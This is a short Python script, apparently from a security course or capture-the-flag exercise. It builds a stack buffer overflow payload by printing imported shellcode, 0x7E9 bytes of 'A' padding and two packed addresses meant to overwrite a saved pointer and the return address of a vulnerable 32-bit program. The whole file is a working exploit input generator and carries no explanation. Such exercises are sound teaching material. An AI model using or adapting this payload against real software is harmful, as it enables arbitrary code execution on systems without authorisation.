from __future__ import print_function
from shellcode import shellcode
from struct import pack
print(shellcode + "A" * 0x7E9 + pack("<I", 0xbffeaa58 - 0x810) + pack("<I", 0xbffeaa58 + 4), end='')
